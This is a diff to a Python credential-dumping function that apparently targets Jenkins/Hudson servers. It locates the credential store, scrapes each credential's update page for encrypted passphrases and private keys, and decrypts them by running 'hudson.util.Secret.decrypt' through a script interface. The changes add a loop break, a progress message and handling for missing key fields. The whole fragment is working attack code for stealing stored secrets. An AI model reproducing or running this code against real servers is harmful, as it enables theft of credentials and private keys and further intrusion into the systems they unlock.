@@ -91,6 +91,7 @@ def credential_recovery(target):
             res = requests.get(url + u)
             if res.status_code == 200:
                 cred_store_url = u
+                break
         if not cred_store_url:
             print 'Could not locate credential store URL'
             return creds
@@ -105,6 +106,7 @@ def credential_recovery(target):
                     credentials.append(credential)
 
         for credential in credentials:
+            print 'Extracting credential: ' + credential
             res = requests.get(url + cred_store_url + 'credential/' + credential + '/update')
             if res.status_code != 200:
                 continue
@@ -121,8 +123,11 @@ def credential_recovery(target):
 
             elif re.search(r'_\.passphrase', res.text) and re.search(r'_\.privateKey', res.text):
                 e_passphrase = soup.body.findAll(attrs={'name': '_.passphrase'})[0]['value'].strip()
-                private_key = soup.body.findAll(attrs={'name': '_.privateKey'})[0].contents[0].strip()
-
+                key_field = soup.body.findAll(attrs={'name': '_.privateKey'})[0].contents
+                if key_field:
+                    private_key = key_field[0].strip()
+                else:
+                    private_key = 'Could not recover'
                 script = 'hudson.util.Secret.decrypt \'%s\'' % e_passphrase
                 passphrase = script_interface(url, script)
 
